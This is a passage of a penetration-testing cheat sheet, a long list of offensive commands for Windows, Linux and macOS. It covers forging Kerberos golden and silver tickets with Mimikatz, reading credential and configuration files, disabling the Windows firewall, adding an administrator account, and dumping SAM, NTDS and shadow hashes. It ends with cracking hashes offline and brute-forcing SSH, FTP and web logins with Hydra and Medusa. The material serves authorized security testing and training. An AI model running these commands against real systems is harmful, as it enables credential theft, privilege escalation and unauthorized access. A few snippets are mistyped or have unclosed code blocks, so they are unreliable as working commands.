        mimikatz # kerberos::ptt <ticket_kirbi_file>
        ```

        <br></br>
        <b>Generating a silver ticket: AES 256 Key</b>

        ```
        mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
        ```

        <b>Generating a silver ticket: AES 128 Key</b>

        ```
        mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
        ```

        <b>Generating a silver ticket: NTLM</b>

        ```
        mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<ntlm_hash> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
        ```

        

        <br></br>
        <b>## Generating a Golden Ticket: AES 256 Key</b>

        ```
        mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name>
        ```

        <b>## Generating a Golden Ticket: AES 128 Key</b>

        ```
        mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name>
        ```

        <b>## Generating a Golden Ticket: NTLM</b>

        ```
        mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<krbtgt_ntlm_hash> /user:<user_name>
        ```

        <br></br>
    </details>

    <details>
    <summary>Target #1</summary>

    + <details>
        <summary>Files on System</summary>

        + <details>
            <summary>Locating Sensitive Linux Files</summary>

            + 
                <br></br>

                ```
                locate password | more
                ```
                ```
                cat /etc/profile
                ```
                ```                
                cat /etc/passwd
                ```
                ```            
                cat /etc/group
                ```
                ```  
                cat /etc/shadow
                ```
                ```  
                cat /etc/gshadow
                ```
                ```  
                cat /var/apache2/config.inc
                ```
                ```  
                cat /var/lib/mysql/mysql/user.MYD
                ```
                ```  
                cat /root/anaconda-ks.cfg
                ```
                ```  
                cat ~/.bash_history
                ```
                ```  
                cat ~/.bash_profile
                ```
                ```  
                cat ~/.bash_login
                ```
                ```  
                cat ~/.nano_history
                ```
                ```  
                cat ~/.atftp_history
                ```
                ```  
                cat ~/.mysql_history
                ```
                ```  
                cat ~/.php_history
                ```
                ```  
                ls -alh /var/mail/
                ```

                <br></br>
                <b>Sensitive Files for SSH</b>

                ```
                find / -name authorized_keys 2> /dev/null
                ```
                ```
                find / -name id_rsa 2> /dev/null
                ```

                <br></br>
                <b>Helpful Log Files</b>

                ```
                cat /etc/httpd/logs/access_log
                ```
                ```
                cat /etc/httpd/logs/access.log
                ```
                ```
                cat /etc/httpd/logs/error_log
                ```
                ```
                cat /etc/httpd/logs/error.log
                ```
                ```
                cat /var/log/apache2/access_log
                ```
                ```
                cat /var/log/apache2/access.log
                ```
                ```
                cat /var/log/apache2/error_log
                ```
                ```
                cat /var/log/apache2/error.log
                ```
                ```
                cat /var/log/apache/access_log
                ```
                ```
                cat /var/log/apache/access.log
                ```
                ```
                cat /var/log/auth.log
                ```
                ```
                cat /var/log/chttp.log
                ```
                ```
                cat /var/log/cups/error_log
                ```
                ```
                cat /var/log/dpkg.log
                ```
                ```
                cat /var/log/faillog
                ```
                ```
                cat /var/log/httpd/access_log
                ```
                ```
                cat /var/log/httpd/access.log
                ```
                ```
                cat /var/log/httpd/error_log
                ```
                ```
                cat /var/log/httpd/error.log
                ```
                ```
                cat /var/log/lastlog
                ```
                ```
                cat /var/log/lighttpd/access.log
                ```
                ```
                cat /var/log/lighttpd/error.log
                ```
                ```
                cat /var/log/lighttpd/lighttpd.access.log
                ```
                ```
                cat /var/log/lighttpd/lighttpd.error.log
                ```
                ```
                cat /var/log/messages
                ```
                ```
                cat /var/log/secure
                ```
                ```
                cat /var/log/syslog
                ```
                ```
                cat /var/log/wtmp
                ```
                ```
                cat /var/log/xferlog
                ```
                ```
                cat /var/log/yum.log
                ```
                ```
                cat /var/run/utmp
                ```
                ```
                cat /var/webmin/miniserv.log
                ```
                ```
                cat /var/www/logs/access_log
                ```
                ```
                cat /var/www/logs/access.log
                ```
                ```
                ls -alh /var/lib/dhcp3/
                ```
                ```
                ls -alh /var/log/postgresql/
                ```
                ```
                ls -alh /var/log/proftpd/
                ```
                ```
                ls -alh /var/log/samba/
                ```
                ```                
                Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp
                ```

                <br></br>
                <li><b></b></li>
                <br></br>
            </details>

            <details>
            <summary>Sensitive Windows Files</summary>

            + 
                <br></br>

                ```
                %windir%\repair\sam
                ```
                ```
                %windir%\System32\config\RegBack\SAM
                ```
                ```
                %windir%\repair\system
                ```
                ```
                %windir%\repair\software
                ```
                ```
                %windir%\repair\security
                ```
                ```
                %windir%\debug\NetSetup.log (AD domain name, DC name, internal IP, DA account)
                ```
                ```
                %windir%\iis6.log (5,6 or 7)
                ```
                ```
                %windir%\system32\logfiles\httperr\httperr1.log
                ```
                ```
                C:\sysprep.inf
                ```
                ```
                C:\sysprep\sysprep.inf
                ```
                ```
                C:\sysprep\sysprep.xml
                ```
                ```
                %windir%\Panther\Unattended.xml
                ```
                ```
                C:\inetpub\wwwroot\Web.config
                ```
                ```
                %windir%\system32\config\AppEvent.Evt (Application log)
                ```
                ```
                %windir%\system32\config\SecEvent.Evt (Security log)
                ```
                ```
                %windir%\system32\config\default.sav
                ```
                ```
                %windir%\system32\config\security.sav
                ```
                ```
                %windir%\system32\config\software.sav
                ```
                ```
                %windir%\system32\config\system.sav
                ```
                ```
                %windir%\system32\inetsrv\config\applicationHost.config
                ```
                ```
                %windir%\system32\inetsrv\config\schema\ASPNET_schema.xml
                ```
                ```
                %windir%\System32\drivers\etc\hosts (dns entries)
                ```
                ```
                %windir%\System32\drivers\etc\networks (network settings)
                ```
                ```
                %windir%\system32\config\SAM (only really useful if you have access to the files while the machine is off)
                ```
                ```
                %windir%\unattend.xml
                ```
                ```
                %windir%\Windows\Panther\Unattend.xml
                ```
                ```
                %windir%\Windows\Panther\Unattend\Unattend.xml
                ```
                ```
                %windir%\Windows\system32\sysprep.inf
                ```
                ```
                %windir%\Windows\system32\sysprep\sysprep.xml
                ```
                ```
                C:\ProgramData\Configs\*
                ```
                ```
                C:\Program Files\Windows PowerShell\*
                ```
                ```
                dir c:*vnc.ini /s /b
                ```
                ```
                dir c:*ultravnc.ini /s /b
                ```

                <br></br>
                <b>Search For Contents within File</b>

                ```
                cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
                ```
                ```
                findstr /si password *.xml *.ini *.txt *.config
                ```
                ```
                findstr /spin "password" *.*    
                ```

                <br></br>
                <b>Search for File with Certain Name</b>

                ```
                dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
                ```
                ```
                where /R C:\ user.txt
                ```
                ```
                where /R C:\ *.ini 
                ```

                <br></br>
            </details>
        </details>

    + <details>
        <summary>Installed Application</summary>

        + <details>
            <summary>General Notes Linux</summary>

            + 
                <br></br>
                <b>Debian</b>

                ```
                ls -alh /usr/bin/
                ```
                ```
                ls -alh /sbin/
                ```
                ```
                dpkg -l
                ```
                ```
                ls -alh /var/cache/apt/archivesO
                ```
                ```
                ls /usr/share/applications | awk -F '.desktop' ' { print $1}' -
                ```

                <br></br>
                <b>RedHat</b>

                ```
                rpm -qa
                ```
                ```
                ls -alh /var/cache/yum/
                ```
                
                <br></br>
                <b>BSD</b>

                ```
                pkg_info
                ```

                <br></br>
                <b>Gentoo</b>

                ```
                equery list
                eix -I
                ```

                <br></br>
                <b>Arch Linux</b>

                ```
                pacman -Q
                ```

                <br></br>
                <b>Bash Script</b>

                ```
                #!/bin/bash
                IFS=: read -ra dirs_in_path <<< "$PATH"

                for dir in "${dirs_in_path[@]}"; do
                    for file in "$dir"/*; do
                        [[ -x $file && -f $file ]] && printf '%s\n' "${file##*/}"
                    done
                done
                ```

                <br></br>
            </details>

            <details>
            <summary>General Notes Windows</summary>

            + 
                <br></br>
                <b>PowerShell</b>

                ```
                Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table –AutoSize
                ```

                <br></br>
                <b>Obtaining a list of programs from a remote system</b>

                ```
                Invoke-command -computer remote_pc_name {Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize }
                ```

                <br></br>
                <b>Pull List of Software Installed on Users System</b>

                ```
                $listsoftware= Get-ChildItem HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall

                $names = $listsoftware |foreach-object {Get-ItemProperty $_.PsPath}

                foreach ($name in $names)
                {
                    Write-Host $name.Displayname
                }
                ```

                <br></br>
                <b>WMI</b>

                ```
                Get-WmiObject -Class Win32_Product | Select-Object -Property Name > C:\InstalledSoftwareList.txt
                ```

                <b>Review Installed Windows Features</b>

                ```
                Get-WindowsFeature | Where-Object {$_.InstallState -eq 'Installed'}
                ```

                <br></br>
                <b>WMIC (Planned to be Deprecated)(Can be very Slow to run)</b>

                ```
                wmic /output:C:\InstalledSoftwareList.txt product get name,version
                ```
                <b>WMIC: Save to Text File</b>

                ```
                wmic product get name,version /format:csv > C:\InstalledSoftware.csv
                ```
                
                <br></br>
            </details>
        </details>

    + <details>
        <summary>Network</summary>

        + <details>
            <summary>General Notes Linux</summary>

            + 
                <br></br>
                <b>What does the targets network look like</b>

                ```
                /sbin/ifconfig -a
                ```
                ```
                /sbin/ip addr
                ```
                ```
                cat /etc/network/interfaces
                ```
                ```
                cat /etc/sysconfig/network
                ```
                ```
                ip addr show
                ```

                <br></br>
                <b>Network configuration Settings</b>

                ```
                cat /etc/resolv.conf
                ```
                ```
                cat /etc/sysconfig/network
                ```
                ```
                cat /etc/networks
                ```
                ```
                iptables -L
                ```
                ```
                hostname
                ```
                ```
                dnsdomainname
                ```

                <br></br>
                <b>List all current connections</b>

                ```
                lsof -i
                ```
                ```
                lsof -i :80
                ```
                ```
                grep 80 /etc/services
                ```
                ```
                netstat -antup
                ```
                ```
                netstat -antpx
                ```
                ```
                netstat -tulpn
                ```
                ```
                chkconfig --list
                ```
                ```
                chkconfig --list | grep 3:on
                ```

                <br></br>
                <b>Check the routes</b>

                ```
                arp -e
                ```
                ```
                route
                ```
                ```
                route -n
                ```
                ```
                /sbin/route -nee
                ```
                ```
                ip route list
                ```

                <br></br>
                <li><b></b></li>
                <br></br>
            </details>

            <details>
            <summary>General Notes Windows</summary>

            + 
                <br></br>
                <b>List all network interfaces, IP, and DNS</b>

                ```
                ipconfig /all
                ```
                ```
                Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
                ```
                ```
                Get-DnsClientServerAddress -AddressFamily IPv4 | ft
                ```

                <br></br>
                <b>List all current connections</b>

                ```
                netstat -nao
                ```

                <br></br>
                <b>List firewall state and current configuration</b>

                ```
                netsh advfirewall firewall dump
                ```
                ```
                netsh firewall show state
                ```
                ```
                netsh firewall show config
                ```

                <br></br>
                <b>List firewall's blocked ports</b>

                ```
                f=New-object -comObject HNetCfg.FwPolicy2;f.rules | where {$_.action -eq "0"} | select name,applicationname,localports
                ```

                <br></br>
                <b>Disable firewall</b>

                ```
                netsh firewall set opmode disable (Older Versions of Windows)
                ```
                ```
                netsh advfirewall set allprofiles state off
                ```

                <br></br>
                <b>List current routing table</b>

                ```
                route print
                ```
                ```
                Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
                ```

                <br></br>
                <b>List the ARP table</b>

                ```
                arp -A
                ```
                ```
                Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
                ```

                <br></br>
                <b>List all network shares</b>

                ```
                net share
                ```

                <br></br>
                <b>Wifi Passwords: Finding The SSID</b>

                ```
                netsh wland show profile
                ```

                <b>Wifi Passwords: Obtain Cleartext password</b>

                ```
                netsh wlan show profile key=clear
                ```
                ```
                cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
                ```

                <br></br>
            </details>
        </details>

    + <details>
        <summary>Running Processes</summary>

        + <details>
            <summary>General Notes Linux</summary>

            + 
                <br></br>
                <b>Linux Commands to Run</b>

                ```
                top
                ```
                ```
                htop
                ```
                ```
                ps -e
                ```
                ps -ef
                ```
                ps aux
                ```
                ```
                ps aux | more
                ```
                ```
                ps aux | less
                ```
                ```
                ps -fc leafpad
                ```

                <br></br>
                <b>Jobs: List Jobs</b>

                ```
                jobs
                ```

                <b>Jobs: Send to Foreground</b>

                ```
                fg
                ```

                <b>Jobs: Send Job id 3 to Foreground</b>

                ```
                fg %3
                ```

                <b>Jobs: Send Current Job to Foreground</b>

                ```
                fg %+
                ```

                <b>Jobs: Send Previous Job to Foreground</b>

                ```
                fg %-
                ```

                <b>Jobs: Send Ping Job to Foreground</b>

                ```
                fg %ping
                ```

                <b>Jobs: Resume in Background</b>

                ```
                bg
                ```

                <br></br>
                <b>Finding Processes</b>

                ```
                pgrep
                ```

                <br></br>
                <b>Terminating a Process</b>

                ```
                kill
                ```
                ```
                kill -9 PID
                ```
                ```
                pkill processName
                ```
                ```
                killall
                ```

                <br></br>
            </details>

            <details>
            <summary>General Notes Windows</summary>

            + 
                <br></br>
                <b>Check for Processes</b>

                ```
                tasklist
                ```
                ```
                wmic process list full
                ```

                <br></br>
                <b>Check for Processes in PowerShell</b>

                ```
                Get-Process
                ```
                ```
                Get-Process -Name 'Notepad'
                ```

                <b>List Path of Running Process</b>

                ```
                (Get-Process -Name 'Calculator').Path
                ```

                <br></br>
            </details>
        </details>

    + <details>
        <summary>Scheduled Jobs/Tasks</summary>

        + <details>
            <summary>General Notes Linux</summary>

            + 
                <br></br>

                ```
                cat /etc/crontab
                ```
                ```
                cat /etc/anacrontab
                ```
                ```
                cat /etc/frontal
                ```
                ```
                cat /etc/anacron
                ```
                ```
                systemctl list-timers --all
                ```

                <br></br>
            </details>

            <details>
            <summary>General Notes Windows</summary>

            + 
                <br></br>

                ```
                schtasks
                ```

                <b>Impacket</b>

                ```
                python3 atexec.py Domain/Administrator:<password>@123@172.21.0.0 systeminfo</password>
                ```

                <br></br>
            </details>
        </details>

    + <details>
        <summary>System Information</summary>

        + <details>
            <summary>General Notes Linux</summary>

            + 
                <br></br>

                ```
                uname -a
                ```
                ```
                cat /etc/issue
                ```
                ```
                cat /proc/version
                ```

                <b>Debian</b>

                ```
                dmesg | grep Linux
                ```

                <b>RedHat</b>
                
                ```
                rpm -q kernel
                ```

                <br></br>
            </details>

            <details>
            <summary>General Notes Windows</summary>

            + 
                <br></br>
                <b>Command Line</b>

                ```
                systeminfo
                ```

                <b>PowerShell</b>

                ```
                Get-ComputerInfo
                ```
                ```
                Get-ComputerInfo -Property "*version"
                ```
                ```
                Get-ComputerInfo -Property "*version", "os*" | select WindowsCurrentVersion, WindowsVersion, OsName, OsBuildNumber, OsHotFixes, OsArchitecture | fl
                ```
                ```
                $PSVersionTable
                ```
                
                <b>Obtaining Sytem Enviornment Variables</b>

                ```
                Get-ChildItem -Path Env
                ```

                <br></br>
            </details>
        </details>

    + <details>
        <summary>Users and Groups</summary>

        + <details>
            <summary>General Notes Linux</summary>

            + 
                <br></br>
                <b>Enumerating Linux Users</b>

                ```
                cat /etc/passwd
                ```
                less etc/passwd
                ```
                getent passwd | awk -F: '{ print $1}'
                ```
                ```
                cut -d: -f1 /etc/passwd
                ```
                ```
                awk –F: ‘{ print $1}’ /etc/passwd
                ```
                ```
                getent parrwd {1000..6000}
                ```

                <br></br>
                <b>Enumerating User Permissions</b>

                ```
                id
                ```
                ```
                id -nG
                ```
                ```
                getent group
                ```

                <br></br>
                <b>Enumerating Linux Groups</b>

                ```
                groups
                ```
                ```
                less /etc/group
                ```
                ```
                getent groups
                ```
                ```
                getent group | awk -F: '{ print $1}'
                ```    

                <br></br>
                <li><b></b></li>
                <br></br>
            </details>

            <details>
            <summary>General Notes Windows</summary>

            + 
                <br></br>
                <b>Current User</b>

                ```
                whoami
                ```

                <br></br>
                <b>View information about the current user</b>

                ```
                net user afsimmons
                ```
                ```
                net user afsimmons /domain (For a domain user)
                ```

                <br></br>
                <b>Add New User</b>

                ```
                net user afsimmons enterpasswordhere /add
                ```

                <br></br>
                <b>Add User to LocalGroup</b>

                ```
                net localgroup Administrators afsimmons
                ```

                <br></br>
                <li><b></b></li>
                <br></br>
            </details>
        </details>
    </details>
</details>

<details>
<summary>High Value Information</summary>

+ <details>
    <summary>Hashes</summary>

    + <details>
        <summary>Dumping Hashes</summary>
        
        + <details>
            <summary>Windows</summary>
            
            + 
                <br></br>
                <b>Meterpreter HashDump</b>

                ```
                run post/windows/gather/hashdump
                ```

                <br></br>
                <b>Meterpreter Mimikatz (Post Exploitation must be executed from SYSTEM privileges)</b>

                ```
                load mimikatz
                ```
                ```
                creds_all
                ```

                <b>Meterpreter Mimikatz: Dump LSA Secrets</b>

                ```
                lsadump.py sys_backup.hiv sec_backup.hiv
                ```

                <b>Meterpreter Mimikatz: Dump Local Password Hashes</b>

                ```
                pwdump.py sys_backup.hiv sec_backup.hiv
                ```

                <br></br>
                <b>reg.exe</b>

                ```
                reg save HKLM\sam sam
                ```
                ```
                reg save HKLM\system system
                ```

                <br></br>
                <b>samdump2</b>

                ```
                samdump2 SYSTEM SAM > hashes.db
                ```

                <br></br>
                <b>Impacket Tools</b>

                ```
                secretsdump.py -ntds ~/Extract/ntds.dit -system ~/Extract/SYSTEM -hashes lmhash:nthash LOCAL -outputfile ntlm-hashes
                ```

                <b>Impacket Tools: Have the NTDS.dit file And SYSTEM Hive</b>

                ```
                secretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/systemhive LOCAL
                ```

                <br></br>
            </details>

            <details>
            <summary>Linux</summary>
            
            + 
                <br></br>
                <b>Requires Root Priv</b>

                ```
                cat /etc/shadow
                ```
                ```
                cp /etc/passwd and shadow
                ```
                ```    
                unshadow passwd shadow
                ```

                <br></br>
            </details>

            <details>
            <summary>OSX</summary>
            
            + 
                <br></br>
                <b>10.5-10.7</b>

                ```
                dscl localhost -read /Search/Users/<username>|grep GeneratedUID|cut -c15-cat /var/db/shadow/hash/ <guid>| cut -c169-216 > osx_hash.txt</guid></username>
                ```

                <b>10.8-10.12</b>

                ```
                sudo defaults read /var/db/dslocal/nodes/Default/users/<username>.plist ShadowHashData|tr -dc ‘0-9a-f’|xxd -p -r|plutil -convert xml1 - -o -</username>
                ```

                <br></br>
                <li><b></b></li>
                <br></br>
            </details>

            <details>
            <summary>Other Resources</summary>
            
            + 
                <br></br>
                <b>Lsassy</b>

                ```
                https://github.com/Hackndo/lsassy
                ```

                <br></br>
            </details>
        </details>

    + <details>
        <summary>Identifying Hash Types</summary>
        
        + 
            <br></br>
            <b>Kali</b>

            ```
            Hash-identifier
            ```

            <b>Online</b>
            ```
            https://www.tunnelsup.com/hash-analyzer/
            ```

            <br></br>
        </details>

    + <details>
        <summary>Cracking Hashes Offline</summary>
        
        + <details>
            <summary>Wordlists</summary>
            
            + 
                <br></br>
                <b>Local Wordlists</b>

                ```
                /usr/share/wordlists
                ```

                <b>SecLists</b>

                ```
                apt install seclists
                ```
                ```
                https://github.com/danielmiessler/SecLists/tree/master/Usernames
                ```
                ```
                https://github.com/danielmiessler/SecLists/tree/master/Passwords
                ```

                <b>Have I been Pwned</b>

                ```
                https://haveibeenpwned.com/Passwords
                ```

                <b>CrackStations Dictionary List</b>

                ```
                https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm
                ```

                <b>Rainbow Tables (Rainbow Crack)</b>

                ```
                http://project-rainbowcrack.com/table.htm
                ```

                <b>Rocktastics Mega Wordlist</b>

                ```
                https://labs.nettitude.com/tools/rocktastic/
                ```

                <b>berzerk0 Wordlist</b>

                ```
                https://www.hack3r.com/forum-topic/wikipedia-wordlist
                ```

                <b>Weakpass</b>

                ```
                https://www.hack3r.com/forum-topic/wikipedia-wordlist
                ```

                <b>Tools</b>

                ```
                Crunch
                ```
                ```
                cewl
                ```

                <br></br>
            </details>
            
            <details>
            <summary>John The Ripper</summary>
            
            + 
                <br></br>
                <b>DICTIONARY ATTACK</b>

                ```
                john --format=#type --wordlist=dict.txt hash.txt
                ```

                <b>BruteForce Attack</b>

                ```
                john --format=#type hash. txt
                ```

                <b>Mask Attack</b>

                ```
                john --format=#type --mask=?l?l?l?l?l?l hash.txt -min-len=6
                ```

                <b>Incremental Attack</b>

                ```
                john --incremental hash.txt
                ```

                <b>Dictionary + Rules Attack</b>

                ```
                john --format=#type --wordlist=dict.t
                ```

                <b>Benchmark Test</b>

                ```
                john --test
                ```

                <b>Session Name</b>

                ```
                john hash.txt --session=example_name
                ```

                <b>Session Restore</b>

                ```
                john --restore=example_name
                ```

                <b>Show Cracked Results</b>

                ```
                john hash.txt --pot= <john potfile="">--show</john>
                ```

                <b>Word List Generation</b>

                ```
                john --wordlist=dict.txt --stdout --external:[filter name] > out.txt
                ```

                <b>Cracking SSH Keys</b>

                ```
                /usr/share/john/ssh2john.py id_rsa > hash.john
                ```
                ```
                john --wordlist=/usr/share/wordlists/rockyou.txt hash.john
                ```

                <b>Cracking KRB5TGS Keys</b>

                ```
                john --format=krb5tgs --wordlist=<passwords_file krb-key.txt
                ```

                <b>Cracking ASREP Keys</b>

                ```
                john --format=krb5asrep --wordlist=<passwords_file asrep-key.txt
                ```

                <br></br>
            </details>

            <details>
            <summary>Hashcat</summary>
            
            + 
                <br></br>
                <b>Benchmark Test (Hash Type)</b>

                ```
                hashcat -b -m #type
                ```

                <b>Show Example Hash</b>

                ```
                hashcat -m #type --example-hashes
                ```
                
                <b>Dictionary Attack</b>

                ```
                hashcat -a 0 -m #type hash.txt dict.txt
                ```

                <b>Dictionary + Rules Attack</b>

                ```
                hashcat -a 0 -m #type hash.txt dict.txt -r rule.txt
                ```

                <b>Combination Attack</b>

                ```
                hashcat -a 1 -m #type hash.txt dict1.txt dict2.txt
                ```

                <b>Mask Attack</b>

                ```
                hashcat -a 3 -m #type hash.txt ?a?a?a?a?a?a
                ```

                <b>Hybrid Dictionary + Mask</b>

                ```
                hashcat -a 6 -m #type hash.txt dict.txt ?a?a?a?a
                ```

                <b>Hybrid Mask + Dictionary</b>

                ```
                hashcat -a 7 -m #type hash.txt ?a?a?a?a dict.txt
                ```

                <b>Default Increment</b>

                ```
                hashcat -a 3 -m #type hash.txt ?a?a?a?a?a --increment
                ```

                <b>Increment Minimum Length</b>

                ```
                hashcat -a 3 -m #type hash.txt ?a?a?a?a?a --increment-min=4
                ```

                <b>Increment Max Length</b>

                ```
                hashcat -a 3 -m #type hash.txt ?a?a?a?a?a?a --increment-max=5
                ```

                <b>Session Restore</b>

                ```
                hashcat -a 0 -m #type --restore --session <uniq_name> hash.txt dict.txt
                
                ```

                <b>Cracking krb5ts Keys</b>

                ```
                hashcat -m 13100 --force <TGSs_file> <passwords_file>
                
                ```

                <b>Cracking Asrep keys</b>

                ```
                hashcat -a 0 -m 18200 <asrep_file> <password_file>
                
                ```

                <br></br>
            </details>

            <details>
            <summary>Cracking WEP/WPA/WPA 2PSK Authentication</summary>
            
            + 
                <br></br>
                <b>Cracking Handshake with Aircrack</b>

                ```
                aircrack-ng -w /usr/share/wordlist/fasttrack.txt 0001.cap
                ```

                <br></br>
                <b>Cracking Handshake with Hashcat</b>

                ```
                hashcat.exe -m 2500 capture.hccapx rockyou.txt (Dictionary Attack)
                ```
                ```
                hashcat.exe -m 2500 -a3 capture.hccapx ?d?d?d?d?d?d?d?d (Brute-Force)
                ```
                ```
                hashcat.exe -m 2500 -r rules/best64.rule capture.hccapx rockyou.txt (Rule-Based)
                ```

                <br></br>
                <b>Cracking Handshake with John The Ripper</b>

                ```
                hpccap2john
                ```
                ```
                john --format=wpapsk --wordlist=/usr/share/wordlists/rockyou.txt crackmecap
                ```
                ```
                john --format=wpapsk-opencl --wordlist=/usr/share/wordlists/rockyou.txt crackmecap
                ```
                


                <br></br>
                <b>Other Resources</b>

                ```
                https://github.com/lgandx/PCredz
                ```

                <br></br>
            </details>

        </details>

    + <details>
        <summary>Cracking Hashes Online</summary>
        
        + <details>
            <summary>Medusa</summary>
            
            + 
                <br></br>

                ```
                medusa -h target-ip -u [username] -P ../creds/passwords.txt -M http
                ```
                ```    
                medusa -h 172.21.0.0 -U [path to username file] -P [path to password file] -M ftp
                ```
                ```    
                medusa -H hosts.txt -U [path to username file] -P [path to password file] -M http
                ```
                ```    
                medusa -h 172.21.0.0 -U [path to username file] -P [path to password file] -M ssh -n 2222
                ```
                ```    
                medusa -h 172.21.0.0 -U [path to username file] -P [path to password file] -M ftp -O log.txt
                
                ```

                <br></br>
            </details>
            
            <details>
            <summary>Hydra</summary>
            
            + 
                <br></br>
                <b></b>

                ```
                hydra -l user -P pass.txt -t 10 172.21.0.0 ssh -s 22
                ```
                ```
                hydra -l users.txt -p /usr/share/wordlists/rockyou.txt -t 172.21.0.0 ssh -s 22
                ```
                ```    
                hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
                ```

                <br></br>
            </details>
        </details>
    </details>
</details>
